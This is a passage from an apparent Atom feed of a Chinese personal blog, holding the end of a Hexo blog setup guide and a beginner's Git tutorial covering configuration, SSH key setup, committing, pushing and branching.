class="line">hexo generate   #缩写：hexo g    </div><div class="line"></div><div class="line">hexo server     #缩写：hexo s     # 部署在本地        </div><div class="line">hexo deploy     #缩写：hexo d     # 部署到github</div></pre></td></tr></table></figure><h3><span id="7备份">7.备份</span></h3><p>由于<code>hexo d</code>只会把生成的静态页面上传到github，为方便修改blog，把<code>MyBlog</code>下的所有源码传到<code>yourname.github.io.git</code>的<code>backup</code>分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cd MyBlog</div><div class="line">git init</div><div class="line">git remote add origin git@github.com:username/yourname.github.io.git</div><div class="line">git add .</div><div class="line">git commit -m &quot;#&quot;</div><div class="line">git push origin backup</div></pre></td></tr></table></figure></p><h3><span id="参考">参考</span></h3><p><a href="https://hexo.io/docs/" target="_blank" rel="external">https://hexo.io/docs/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0&quot;&gt;0&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;建议先看&lt;a href=&quot;/2000/01/01/Git/&quot;&gt;Git&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;1安装nodejs&quot;&gt;1.安装NodeJs&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https
      
    
    </summary>
    
      <category term="搭博客" scheme="https://unothing.github.io/categories/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="hexo" scheme="https://unothing.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Git</title>
    <link href="https://unothing.github.io/2000/01/01/Git/"/>
    <id>https://unothing.github.io/2000/01/01/Git/</id>
    <published>1999-12-31T16:00:00.000Z</published>
    <updated>2018-05-05T12:58:36.426Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1初始化">1.初始化</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git config --global user.name &quot;Your Name&quot;</div><div class="line">git config --global user.email &quot;email@example.com&quot;</div><div class="line"></div><div class="line">mkdir MyBlog</div><div class="line">cd MyBlog</div><div class="line">git init</div></pre></td></tr></table></figure><h3><span id="2关联github">2.关联github</span></h3><p>本地git关联github帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</div><div class="line"></div><div class="line">在用户主目录中.ssh目录里生成id_rsa和id_rsa.pub两个文件</div><div class="line">把id_rsa.pub粘贴到github的SSH KEYS里</div></pre></td></tr></table></figure></p><p>关联仓库的两种情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git remote add origin git@github.com:username/MyBlog.git</div><div class="line"># 除了git协议还支持https://github.com/username/MyBlog.git，但是用https，在push时会要求填帐号密码</div><div class="line"></div><div class="line"></div><div class="line">git clone git@github.com:username/MyBlog.git</div><div class="line">#从远程仓库克隆时，实际上Git会自动把本地的master分支和远程的master分支对应起来，并且远程仓库的默认名称是origin。</div></pre></td></tr></table></figure></p><h3><span id="3添加与推送文件">3.添加与推送文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">vim readme.txt</div><div class="line">vim index.php</div><div class="line">git add readme.txt</div><div class="line">git add index.php</div><div class="line">    # $ git add readme.txt</div><div class="line">    # warning: LF will be replaced by CRLF in readme.txt.</div><div class="line">    # The file will have its original line endings in your working directory.</div><div class="line">    # 原因：windows下vim自动给最后加了一个换行，可改用notepad++编辑文件</div><div class="line"></div><div class="line">#可以用 git add -A 或 git add . 提交所有变化</div><div class="line"></div><div class="line">git commit -m &quot;commit 2 files together&quot;</div><div class="line">    # git commit -m &quot;#&quot;     无描述</div><div class="line"></div><div class="line">rm readme.txt</div><div class="line">git rm readme.txt</div><div class="line">git commit -m &quot;remove readme.txt&quot;</div><div class="line"></div><div class="line">git push -u origin master       # 第一次加上-u和远程master分支关联</div><div class="line">git push origin master</div></pre></td></tr></table></figure><h3><span id="4分支">4.分支</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">git branch dev      # 添加dev分支</div><div class="line">git checkout dev        # 切换分支      </div><div class="line">        # git checkout -b dev       新建并切换到dev分支</div><div class="line">git branch      # 查看分支</div><div class="line"></div><div class="line">git checkout master</div><div class="line">git merge dev       # git merge命令用于合并指定分支到当前分支</div><div class="line"></div><div class="line">git branch -d dev       #删除dev</div><div class="line"></div><div class="line">git push origin dev</div><div class="line"></div><div class="line"># 默认git clone 只有master 不会有分支，该命令把远程的dev分支拉到本地</div><div class="line">git checkout -b dev origin/dev</div></pre></td></tr></table></figure><h3><span id="5">5</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 拉取最新变更</div><div class="line">git pull git@github.com:yourname/MyBlog.git</div></pre></td></tr></table></figure><h3><span id="参考">参考</span></h3><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="external">廖雪峰git教程</a></p><p><a href="https://git-scm.com/" target="_blank" rel="external">https://git-scm.com/</a></p><p><a href="https://github.com/github/gitignore" target="_blank" rel="external">https://github.com/github/gitignore</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;1初始化&quot;&gt;1.初始化&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=
      
    
    </summary>
    
      <category term="搭博客" scheme="https://unothing.github.io/categories/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="git" scheme="https://unothing.github.io/tags/git/"/>
    
  </entry>
  
</feed>
